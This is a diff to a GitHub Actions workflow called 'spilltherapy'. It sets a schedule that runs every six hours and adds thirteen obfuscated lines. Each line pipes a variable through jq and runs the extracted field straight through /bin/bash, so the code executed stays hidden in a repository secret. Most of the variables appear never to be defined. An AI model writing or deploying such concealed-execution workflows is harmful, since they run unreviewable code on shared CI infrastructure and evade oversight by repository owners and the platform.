@@ -1,8 +1,9 @@
 name: spilltherapy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '23 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,15 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: spilltherapy
         env:
-          lbn867: ${{ secrets.lbn867 }}
+          xvloj04: ${{ secrets.xvloj04 }}
         run: |
-          echo $lbn867 | jq -r .b15 | /bin/bash
-          echo $gn56247 | jq -r .ma07 | /bin/bash
-          echo $ybjf43305 | jq -r .qs81631 | /bin/bash
-          echo $f52086 | jq -r .u02 | /bin/bash
-          echo $ootp79258 | jq -r .hye677 | /bin/bash
-          echo $kf2147 | jq -r .g6469 | /bin/bash
-          echo $frl76 | jq -r .n4795 | /bin/bash
-          echo $zuh64 | jq -r .yfq27518 | /bin/bash
-          echo $bzlu636 | jq -r .ps9 | /bin/bash
+          echo $xvloj04 | jq -r .j11870 | /bin/bash
+          echo $wmtk05457 | jq -r .uclh77 | /bin/bash
+          echo $yd2 | jq -r .yye0 | /bin/bash
+          echo $q79 | jq -r .h705 | /bin/bash
+          echo $q513 | jq -r .nhuva10674 | /bin/bash
+          echo $s7 | jq -r .jctt082 | /bin/bash
+          echo $wrs5173 | jq -r .zd5556 | /bin/bash
+          echo $ahof950 | jq -r .tendb56 | /bin/bash
+          echo $v4 | jq -r .x7754 | /bin/bash
+          echo $wb6 | jq -r .ma3 | /bin/bash
+          echo $icbqa12369 | jq -r .xouy902 | /bin/bash
+          echo $liwqj187 | jq -r .mlup88 | /bin/bash
+          echo $fikld14095 | jq -r .h023 | /bin/bash
 
